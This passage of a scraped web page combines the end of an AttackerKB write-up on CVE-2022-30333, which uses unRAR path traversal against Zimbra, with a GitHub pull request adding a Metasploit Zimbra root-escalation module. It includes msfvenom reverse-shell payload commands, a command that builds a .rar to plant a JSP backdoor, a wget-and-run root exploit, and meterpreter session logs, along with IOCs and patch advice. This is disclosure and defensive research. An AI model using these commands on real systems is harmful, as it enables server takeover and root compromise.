```

In any case, once the link is loaded, our payload triggers:

```
[...]
[*] Started reverse TCP handler on 10.0.0.146:4444
[*] Sending stage (3020772 bytes) to 10.0.0.154
[*] Meterpreter session 1 opened (10.0.0.146:4444 -> 10.0.0.154:42032) at 2022-07-15 10:56:46 -0700
meterpreter > getuid
Server username: zimbra

```
### Automated exploit

Since generating a .rar file on Windows then copying it to Linux is a pain, [we put together a tool](https://github.com/rbowes-r7/unrar-cve-2022-30333-poc) that’ll generate a CVE-2022-30333 .rar file out of whole cloth. We used it with a Metasploit payload to exploit Zimbra using the following command:

```
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.146 -f jsp -o payload.jsp
$ ruby ./cve-2022-30333.rb '../../../../../../../../../../../opt/zimbra/jetty_base/webapps/zimbra/public/backdoor.jsp' ./payload.jsp > file.rar

```

Because the .rar file is [proprietary](https://github.com/pmachapman/unrar/blob/master/license.txt), that file simply plays “fill-in-the-blank” and builds the .rar file out of pieces.

## IOCs

How to detect exploitation attempts against CVE-2022-30333 will vary depending on how `unrar` is being used. Since we used Zimbra as a representative example of a vulnerable application, we will show IOCs for Zimbra.

### IOCs for Zimbra

Our exploit writes a .jsp file to the web root; new or unusual files in any web directory on Zimbra should be considered suspicious (`/opt/zimbra/jetty_base/webapps/**`). An attacker could easily delete that to cover their tracks, however.

Because our proof of concept doesn’t fix the checksums, we can see a checksum error in the log:

```
ron@zimbra:~$ sudo journalctl | grep -i unrar | tail
Jul 15 17:33:46 zimbra.example.org amavis[65117]: (65117-01) (!)do_unrar: can't parse info line for "" Corrupt header is found\n
Jul 15 17:33:46 zimbra.example.org amavis[65117]: (65117-01) (!)do_unrar: can't parse info line for "" testlink - the file header is corrupt\n
Jul 15 17:55:13 zimbra.example.org amavis[23049]: (23049-01) (!)do_unrar: can't parse info line for "" Corrupt header is found\n
Jul 15 17:55:13 zimbra.example.org amavis[23049]: (23049-01) (!)do_unrar: can't parse info line for "" testlink - the file header is corrupt\n
Jul 15 17:55:13 zimbra.example.org amavis[65117]: (65117-02) (!)do_unrar: can't parse info line for "" Corrupt header is found\n
Jul 15 17:55:13 zimbra.example.org amavis[65117]: (65117-02) (!)do_unrar: can't parse info line for "" testlink - the file header is corrupt\n
Jul 15 18:09:36 zimbra.example.org amavis[23049]: (23049-02) (!)do_unrar: can't parse info line for "" Corrupt header is found\n
Jul 15 18:09:36 zimbra.example.org amavis[23049]: (23049-02) (!)do_unrar: can't parse info line for "" testlink - the file header is corrupt\n
Jul 15 18:09:36 zimbra.example.org amavis[2718]: (02718-01) (!)do_unrar: can't parse info line for "" Corrupt header is found\n
Jul 15 18:09:36 zimbra.example.org amavis[2718]: (02718-01) (!)do_unrar: can't parse info line for "" testlink - the file header is corrupt\n

```

An exploit does not necessarily leave that evidence. If a user receives a suspicious .rar file, that could also indicate exploitation attempts; however, we also determined that the target user does not necessarily need to exist. Even non-delivered messages are scanned.

Scanned emails are temporarily written to `/opt/zimbra/data/amavisd/tmp`, which can be searched for suspicious .rar archives:

```
# fgrep -r 'application/x-rar' /opt/zimbra/data/amavisd/tmp/
/opt/zimbra/data/amavisd/tmp/amavis-20220715T173346-103991-x9QRhIEC/email.txt:Content-Type: application/x-rar; name=test-fixed.rar
/opt/zimbra/data/amavisd/tmp/amavis-20220715T173346-65117-FMBPrQEV/email.txt:Content-Type: application/x-rar; name=test-fixed.rar
/opt/zimbra/data/amavisd/tmp/amavis-20220715T175513-23049-oTr59qOe/email.txt:Content-Type: application/x-rar; name=test-fixed.rar
/opt/zimbra/data/amavisd/tmp/amavis-20220715T180936-02718-xaYD1dfZ/email.txt:Content-Type: application/x-rar; name=test-fixed.rar

```

`/opt/zimbra/log/trace_log.<date>` appears to log received .rar files as well:

```
# fgrep -r '.rar'  /opt/zimbra/log
/opt/zimbra/log/trace_log.2022_07_14:17:46:30.107:qtp1381713434-18:https://10.0.0.154/service/home/~/?auth=co&loc=en_US&id=337&part=2&disp=a RESPONSE 200 application/x-rar; name=test.rar
/opt/zimbra/log/trace_log.2022_07_14:17:46:42.585:qtp1381713434-218:https://10.0.0.154/service/home/~/?auth=co&loc=en_US&id=337&part=2 RESPONSE 200 application/x-rar; name=test.rar
/opt/zimbra/log/trace_log.2022_07_14:17:49:14.298:qtp1381713434-267:https://10.0.0.154/service/home/~/?auth=co&loc=en_US&id=345&part=2&disp=a RESPONSE 200 application/x-rar; name=test.rar
/opt/zimbra/log/trace_log.2022_07_14:17:49:16.073:qtp1381713434-281:https://10.0.0.154/service/home/~/?auth=co&loc=en_US&id=345&part=2 RESPONSE 200 application/x-rar; name=test.rar
/opt/zimbra/log/trace_log.2022_07_14:17:52:42.029:qtp1381713434-292:https://10.0.0.154/service/home/~/?auth=co&loc=en_US&id=270&part=2&disp=a RESPONSE 200 application/x-rar; name=test.rar

```

And finally, all messages are logged in `/opt/zimbra/store`, and can be searched for suspicious .rar files:

```
# fgrep -r 'application/x-rar' /opt/zimbra/store
/opt/zimbra/store/0/3/msg/0/341-473.msg:Content-Type: application/x-rar; name=poc-fixed.rar
/opt/zimbra/store/0/3/msg/0/319-417.msg:Content-Type: application/x-rar; name=poc-fixed.rar
/opt/zimbra/store/0/3/msg/0/303-352.msg:Content-Type: application/x-rar; name=evil.rar
/opt/zimbra/store/0/3/msg/0/315-407.msg:Content-Type: application/x-rar; name=poc-fixed.rar
/opt/zimbra/store/0/3/msg/0/270-122.msg:Content-Type: application/x-rar; name=test.rar
/opt/zimbra/store/0/3/msg/0/296-336.msg:Content-Type: application/x-rar; name=evil.rar
/opt/zimbra/store/0/3/msg/0/364-528.msg:Content-Type: application/x-rar; name=poc-fixed.rar
/opt/zimbra/store/0/3/msg/0/348-489.msg:Content-Type: application/x-rar; name=poc-fixed.rar
/opt/zimbra/store/0/3/msg/0/378-856.msg:Content-Type: application/x-rar; name=test-fixed.rar
/opt/zimbra/store/0/3/msg/0/269-119.msg:Content-Type: application/x-rar; name=test.rar

```

Other than the syslog, all of those logfiles are owned by the `zimbra` user and can therefore be manipulated by attackers.

It’s also worth mentioning that the same version of Zimbra has a [privilege escalation bug](https://darrenmartyn.ie/2021/10/27/zimbra-zmslapd-local-root-exploit/) (*a reminder to please use caution running random scripts off Github*):

```
zimbra@zimbra:/tmp$ wget -q https://raw.githubusercontent.com/darrenmartyn/zimbra-slapper/main/slapper.sh
zimbra@zimbra:/tmp$ bash ./slapper.sh
~ slapper.sh - zimbra zmslapd local privesc exploit ~
[+] Setting up...
[+] Triggering our exploit...
[+] done!
[+] Cleaning up staged files...
[$] Pop root shell
# whoami
root

```
## Guidance

Rapid7 recommends patching all Zimbra installations to the most recent branch. Blocking internet traffic to Zimbra servers makes exploitation more difficult, since exploits such as ours require a direct connection, but not impossible; an intranet browser could easily be tricked into making the request.

## References

* [CVE-2022-30333](https://nvd.nist.gov/vuln/detail/CVE-2022-30333)
* [Sonar’s writeup](https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/)
* [Rarlab’s patch](https://github.com/pmachapman/unrar/commit/22b52431a0581ab5d687747b65662f825ec03946)
* [Zimbra 9.0.0 patch](https://wiki.zimbra.com/wiki/Zimbra_Releases/9.0.0/P25)
* [Zimbra 8.8.15 patch](https://wiki.zimbra.com/wiki/Zimbra_Releases/8.8.15/P32)
* [Privilege escalation bug](https://darrenmartyn.ie/2021/10/27/zimbra-zmslapd-local-root-exploit/)
* [Rarlab](https://www.rarlab.com/)
* [Proof of concept tool](https://github.com/rbowes-r7/unrar-cve-2022-30333-poc)

## Changelog

* 2022-07-19 – clarified the binary vs open-source unRAR versions

# Report as Emergent Threat Response

Please provide the link to the ETR blog if available.

Add a reference URL (optional):

Report as ETR
Update Report

# Report as Exploited in the Wild

AttackerKB users want to know this is information they can trust.

Help the community by indicating the source(s) of your knowledge:

* Vendor Advisory

  Add a reference URL
  (required):

  Please provide a link to the Vendor Advisory.
* Government or Industry Alert

  Add a reference URL
  (required):

  Please provide a link to the Government or Industry Alert.
* Threat Feed

  Add a reference URL
  (required):

  Please provide a link to the Threat Feed.
* News Article or Blog

  Add a reference URL
  (required):

  Please provide a link to the News Reference.
* Exploitation personally observed in an environment (client, customer, employer, or personal environment)

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/RCa4EIZdbZ/cve-2022-30333/assess) as evidence to support your personal observation claim.
* Other:

  Please explain the source of your report.

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/RCa4EIZdbZ/cve-2022-30333/assess) as evidence of the source of your report.

Report and add more details
Report as Exploited
Update Report

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

Cancel
Submit

![](/static/public/img/close-white.svg)
## Quick Cookie Notification

This site uses cookies for anonymized analytics to improve the site.

Rapid7 will never sell the data collected on this site.

I AGREE, LET’S GO!

---

View our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/) for full details

This site uses cookies for anonymized analytics. For more information or to change your cookie settings, view our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/).

![](/static/public/img/close-white.svg)

[Terms of Use](/terms)
[Code of Conduct](/codeofconduct)
[FAQ](/faq)
[Changelog](/changelog)
[Privacy Policy](https://rapid7.com/privacy-policy)
Contact
[API](https://api.attackerkb.com/v1/api-docs/docs)
[A Rapid7 Project](https://www.rapid7.com)

[![](/static/public/img/logo-condensed-dark.png)](/)



=== Content from github.com_7df8c587_20250114_181125.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16807)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F16807)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=rapid7%2Fmetasploit-framework)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[rapid7](/rapid7)
/
**[metasploit-framework](/rapid7/metasploit-framework)**
Public

* [Notifications](/login?return_to=%2Frapid7%2Fmetasploit-framework) You must be signed in to change notification settings
* [Fork
  14.1k](/login?return_to=%2Frapid7%2Fmetasploit-framework)
* [Star
   34.6k](/login?return_to=%2Frapid7%2Fmetasploit-framework)

* [Code](/rapid7/metasploit-framework)
* [Issues
  410](/rapid7/metasploit-framework/issues)
* [Pull requests
  42](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects
  1](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

Additional navigation options

* [Code](/rapid7/metasploit-framework)
* [Issues](/rapid7/metasploit-framework/issues)
* [Pull requests](/rapid7/metasploit-framework/pulls)
* [Discussions](/rapid7/metasploit-framework/discussions)
* [Actions](/rapid7/metasploit-framework/actions)
* [Projects](/rapid7/metasploit-framework/projects)
* [Wiki](/rapid7/metasploit-framework/wiki)
* [Security](/rapid7/metasploit-framework/security)
* [Insights](/rapid7/metasploit-framework/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Frapid7%2Fmetasploit-framework%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# New module for 0-day Zimbra privilege escalation ("slapper") #16807

 Merged

[bwatters-r7](/bwatters-r7)
merged 11 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[rbowes-r7:zimbra-slapper-privesc](/rbowes-r7/metasploit-framework/tree/zimbra-slapper-privesc "rbowes-r7/metasploit-framework:zimbra-slapper-privesc")

Aug 9, 2022

 Merged

# [New module for 0-day Zimbra privilege escalation ("slapper")](#top) #16807

[bwatters-r7](/bwatters-r7)
merged 11 commits into
[rapid7:master](/rapid7/metasploit-framework/tree/master "rapid7/metasploit-framework:master")
from
[rbowes-r7:zimbra-slapper-privesc](/rbowes-r7/metasploit-framework/tree/zimbra-slapper-privesc "rbowes-r7/metasploit-framework:zimbra-slapper-privesc")

Aug 9, 2022

+185

−0

[Conversation
10](/rapid7/metasploit-framework/pull/16807)
[Commits
11](/rapid7/metasploit-framework/pull/16807/commits)
[Checks
0](/rapid7/metasploit-framework/pull/16807/checks)
[Files changed
2](/rapid7/metasploit-framework/pull/16807/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=60&v=4)](/rbowes-r7)

Copy link

Contributor

### @rbowes-r7 **[rbowes-r7](/rbowes-r7)** commented [Jul 21, 2022](#issue-1313803650) • edited Loading

This adds a local exploit for Zimbra, to go from the `zimbra` user to `root` by using a sudo-able executable that can load an arbitrary .so file. This was [publicly disclosed in October of 2021](https://darrenmartyn.ie/2021/10/27/zimbra-zmslapd-local-root-exploit/), but I'm not sure that anybody reported it to Zimbra. (I reported it today, have not heard back yet)

Note that this is branched off of [#16796](https://github.com/rapid7/metasploit-framework/pull/16796) since it goes with that module (and is what I'm using for testing) - I'm happy to re-base if that's a problem!

## Verification

Install Zimbra (sorry) on any supported Linux version and get a session as the `zimbra` user. I used Ubuntu 18.04 for testing, and then [CVE-2022-30333](https://github.com/advisories/GHSA-h4mr-p94x-gf79 "CVE-2022-30333") to exploit, but this will work on a fully patched system as well. Then...

```
msf6 exploit(linux/fileformat/unrar_cve_2022_30333) > sessions -l

Active sessions
===============

  Id  Name  Type                   Information                  Connection
  --  ----  ----                   -----------                  ----------
  10        meterpreter x86/linux  zimbra @ zimbra.example.org  10.0.0.146:4444 -> 10.0.0.154:39800 (10.0.0.154)

msf6 exploit(linux/fileformat/unrar_cve_2022_30333) > use exploit/linux/local/zimbra_slapper_priv_esc
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/zimbra_slapper_priv_esc) > set SESSION 10
SESSION => 10
msf6 exploit(linux/local/zimbra_slapper_priv_esc) > exploit

[*] Started reverse TCP handler on 10.0.0.146:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Executing: sudo -n -l
[+] The target is vulnerable.
[*] Creating exploit directory: /tmp/.5kq9XO
[*] Attempting to trigger payload: sudo /opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/.5kq9XO/.1wNk1h3
[*] Sending stage (3020772 bytes) to 10.0.0.154
[+] Deleted /tmp/.5kq9XO
[*] Meterpreter session 13 opened (10.0.0.146:4444 -> 10.0.0.154:40044) at 2022-07-21 14:04:12 -0700

meterpreter > getuid
Server username: root

```

Sorry, something went wrong.

All reactions

[![@h00die](https://avatars.githubusercontent.com/u/752491?s=80&u=2bcdcc9b6d61eb11c57a93dfaf021cf2201eb11d&v=4)](/h00die)

Copy link

Contributor

### **[h00die](/h00die)** commented [Jul 21, 2022](#issuecomment-1191944118)

| <https://www.youtube.com/watch?v=qPr-xsQvhgw> |
| --- |

 😄
2
 jbaines-r7 and micgenti reacted with laugh emoji

All reactions

* 😄
  2 reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
added
[module](/rapid7/metasploit-framework/labels/module)
[needs-docs](/rapid7/metasploit-framework/labels/needs-docs)
labels
[Jul 21, 2022](#event-7041568239)

[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=80&v=4)](/apps/github-actions)

Copy link

### **[github-actions](/apps/github-actions) bot** commented [Jul 21, 2022](#issuecomment-1191951234)

| Thanks for your pull request! Before this can be merged, we need the following documentation for your module:   * [Writing Module Documentation](https://github.com/rapid7/metasploit-framework/wiki/Writing-Module-Documentation) * [Template](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/module_doc_template.md) * [Examples](https://github.com/rapid7/metasploit-framework/tree/master/documentation/modules) |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=40&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)
[gwillcox-r7](/gwillcox-r7)
added
[docs](/rapid7/metasploit-framework/labels/docs)
and removed
[needs-docs](/rapid7/metasploit-framework/labels/needs-docs)
labels
[Jul 27, 2022](#event-7072725179)

[![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&u=562c1b6600d722e45a20f2202dddeb2d6db1f091&v=4)](/bwatters-r7)
[bwatters-r7](/bwatters-r7)
self-assigned this
[Aug 1, 2022](#event-7103158681)

[![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=80&u=562c1b6600d722e45a20f2202dddeb2d6db1f091&v=4)](/bwatters-r7)

Copy link

Contributor

### **[bwatters-r7](/bwatters-r7)** commented [Aug 2, 2022](#issuecomment-1202961274) • edited Loading

| EDIT: Copy/Pasta fail... This PR shares code and has dependencies from [#16796](https://github.com/rapid7/metasploit-framework/pull/16796) and should be landed after it. |
| --- |

All reactions

Sorry, something went wrong.

[![bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=60&v=4)](/bwatters-r7)

**[bwatters-r7](/bwatters-r7)**
reviewed
[Aug 4, 2022](#pullrequestreview-1062063669)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16807/files)

[modules/exploits/linux/local/zimbra\_slapper\_priv\_esc.rb](/rapid7/metasploit-framework/pull/16807/files#diff-cbd71b0a3e0d0d76d9ae5e0bc6c5dbd114b8fff84a938ee43157684c756b8fc4)
Outdated

Show resolved

Hide resolved

[![bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=60&v=4)](/bwatters-r7)

**[bwatters-r7](/bwatters-r7)**
reviewed
[Aug 4, 2022](#pullrequestreview-1062067767)

 [View reviewed changes](/rapid7/metasploit-framework/pull/16807/files)

[modules/exploits/linux/local/zimbra\_slapper\_priv\_esc.rb](/rapid7/metasploit-framework/pull/16807/files#diff-cbd71b0a3e0d0d76d9ae5e0bc6c5dbd114b8fff84a938ee43157684c756b8fc4)
Outdated

Show resolved

Hide resolved

 [rbowes-r7](/rbowes-r7)
added 11 commits
[August 5, 2022 13:55](#commits-pushed-bba4a23)

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=40&v=4)](/rbowes-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7)

`[Add zimbra_slapper_priv_esc module (privilege escalation in Zimbra, c…](/rapid7/metasploit-framework/pull/16807/commits/bba4a23f6582b668e83aafa26e3953a743b4faab "Add zimbra_slapper_priv_esc module (privilege escalation in Zimbra, currently 0-day)")`
 …

`[bba4a23](/rapid7/metasploit-framework/pull/16807/commits/bba4a23f6582b668e83aafa26e3953a743b4faab)`

```
…urrently 0-day)
```

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=40&v=4)](/rbowes-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7)

`[Make lint happy](/rapid7/metasploit-framework/pull/16807/commits/0fd61e859d188b14215b5183edad62f0df291e2d "Make lint happy")`

`[0fd61e8](/rapid7/metasploit-framework/pull/16807/commits/0fd61e859d188b14215b5183edad62f0df291e2d)`

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=40&v=4)](/rbowes-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7)

`[Cleanups](/rapid7/metasploit-framework/pull/16807/commits/5e1888ee464f91259f77b059e14ab1a544685411 "Cleanups")`

`[5e1888e](/rapid7/metasploit-framework/pull/16807/commits/5e1888ee464f91259f77b059e14ab1a544685411)`

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=40&v=4)](/rbowes-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7)

`[Small cleanup](/rapid7/metasploit-framework/pull/16807/commits/cc27f563ec8f12e584826e8132b38f1c971854d1 "Small cleanup")`

`[cc27f56](/rapid7/metasploit-framework/pull/16807/commits/cc27f563ec8f12e584826e8132b38f1c971854d1)`

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=40&v=4)](/rbowes-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7)

`[Add a note that IOCs show up in logs](/rapid7/metasploit-framework/pull/16807/commits/6e8d04ddc9dec98919d07dbf500768e1b02f158a "Add a note that IOCs show up in logs")`

`[6e8d04d](/rapid7/metasploit-framework/pull/16807/commits/6e8d04ddc9dec98919d07dbf500768e1b02f158a)`

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=40&v=4)](/rbowes-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7)

`[Add documentation](/rapid7/metasploit-framework/pull/16807/commits/be25e1fc775e63644b87ddae13cb240084560754 "Add documentation")`

`[be25e1f](/rapid7/metasploit-framework/pull/16807/commits/be25e1fc775e63644b87ddae13cb240084560754)`

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=40&v=4)](/rbowes-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7)

`[Remove the commented-out CVE, it's making lint sad](/rapid7/metasploit-framework/pull/16807/commits/ea581482d43e1e32aaef8b5052d6f215012d0595 "Remove the commented-out CVE, it's making lint sad")`

`[ea58148](/rapid7/metasploit-framework/pull/16807/commits/ea581482d43e1e32aaef8b5052d6f215012d0595)`

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=40&v=4)](/rbowes-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7)

`[Add a CVE and better description](/rapid7/metasploit-framework/pull/16807/commits/caff6a53f5133f8de7743dbd626868c3dd69bbf6 "Add a CVE and better description")`

`[caff6a5](/rapid7/metasploit-framework/pull/16807/commits/caff6a53f5133f8de7743dbd626868c3dd69bbf6)`

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=40&v=4)](/rbowes-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7)

`[Typo / compile error](/rapid7/metasploit-framework/pull/16807/commits/2cde5f6364c25b86d8e683acf111a38d650b001d "Typo / compile error")`

`[2cde5f6](/rapid7/metasploit-framework/pull/16807/commits/2cde5f6364c25b86d8e683acf111a38d650b001d)`

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=40&v=4)](/rbowes-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7)

`[Change Vulnerable to Appears](/rapid7/metasploit-framework/pull/16807/commits/6564ea971908481e638fa34bca14fb8f56aae638 "Change Vulnerable to Appears")`

`[6564ea9](/rapid7/metasploit-framework/pull/16807/commits/6564ea971908481e638fa34bca14fb8f56aae638)`

[![@rbowes-r7](https://avatars.githubusercontent.com/u/104588115?s=40&v=4)](/rbowes-r7) [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&v=4)](/bwatters-r7)

`[Capture the command output](/rapid7/metasploit-framework/pull/16807/commits/5d7fb283b7aa500ff429d21c28d1611af6b9f4cf "Capture the command output")`

`[5d7fb28](/rapid7/metasploit-framework/pull/16807/commits/5d7fb283b7aa500ff429d21c28d1611af6b9f4cf)`

 [![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&u=562c1b6600d722e45a20f2202dddeb2d6db1f091&v=4)](/bwatters-r7)
[bwatters-r7](/bwatters-r7)
[force-pushed](/rapid7/metasploit-framework/compare/dae8ca21aa52db315dec7554a3e563b5550521b8..5d7fb283b7aa500ff429d21c28d1611af6b9f4cf)
the
zimbra-slapper-privesc

branch
from
[`dae8ca2`](/rapid7/metasploit-framework/commit/dae8ca21aa52db315dec7554a3e563b5550521b8) to
[`5d7fb28`](/rapid7/metasploit-framework/commit/5d7fb283b7aa500ff429d21c28d1611af6b9f4cf)  [Compare](/rapid7/metasploit-framework/compare/dae8ca21aa52db315dec7554a3e563b5550521b8..5d7fb283b7aa500ff429d21c28d1611af6b9f4cf)
[August 5, 2022 18:56](#event-7138018778)

[![@bwatters-r7](https://avatars.githubusercontent.com/u/17987018?s=40&u=562c1b6600d722e45a20f2202dddeb2d6db1f091&v=4)](/bwatters-r7)
[bwatters-r7](/bwatters-r7)
assigned [cdelafuente-r7](/cdelafuente-r7)
[Aug 9, 2022](#event-7156704247)

[![@cdelafuente-r7](https://avatars.githubusercontent.com/u/56716719?s=80&u=742106a5d45f3f0b208d4e88badee1be8d6c4800&v=4)](/cdelafuente-r7)

Copy link

Contributor

### **[cdelafuente-r7](/cdelafuente-r7)** commented [Aug 9, 2022](#issuecomment-1209589519) • edited Loading

| I just tested against Zimbra Collaboration 8.8.15 Patch 31 on Ubuntu 18.04 and it works great! I used `CVE-2022-30333` - path traversal vulnerability in UnRAR [module](https://github.com/rapid7/metasploit-framework/pull/16796) to get a session first.   * Exemple output  ``` msf6 exploit(linux/http/zimbra_unrar_cve_2022_30333) > sessions  Active sessions ===============    Id  Name  Type                   Information                         Connection   --  ----  ----                   -----------                         ----------   1         meterpreter x64/linux  zimbra @ mail.donotexistdomain.foo  10.0.0.1:4444 -> 10.0.0.22:38822 (10.0.0.22)  msf6 exploit(linux/http/zimbra_unrar_cve_2022_30333) > use exploit/linux/local/zimbra_slapper_priv_esc [*] Using configured payload linux/x64/meterpreter/reverse_tcp msf6 exploit(linux/local/zimbra_slapper_priv_esc) > exploit verbose=true lhost=10.0.0.1 SESSION=1  [*] Started reverse TCP handler on 10.0.0.1:4444 [*] Running automatic check ("set AutoCheck false" to disable) [*] Executing: sudo -n -l [+] The target appears to be vulnerable. [*] Creating exploit directory: /tmp/.ng58U2 [*] Creating directory /tmp/.ng58U2 [*] /tmp/.ng58U2 created [*] Attempting to trigger payload: sudo /opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/.ng58U2/.SD4X0GB [*] 